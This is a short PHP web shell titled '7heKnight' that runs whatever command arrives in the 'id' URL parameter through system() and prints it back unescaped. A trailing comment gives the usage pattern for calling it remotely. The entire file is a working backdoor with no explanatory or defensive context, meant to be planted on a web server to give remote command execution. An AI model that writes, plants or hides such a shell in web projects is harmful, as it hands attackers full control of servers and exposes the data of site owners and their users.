<html>
<title>7heKnight</title>
<?php
	echo '<pre>[*]Your command is: <strong>'.$_GET['id'].'</strong><hr/>';
	system($_GET['id'],$bool);
	if($bool!=0){
		echo'<strong>[-] Command not found or do not have permission to execute.</strong><hr/></pre>';
	}else{
		echo'<hr/><strong>[+] Executed successfully</strong></pre>';
	}
?>
</html>
<!--http://.../MyShell.php?id=[your_command]-->
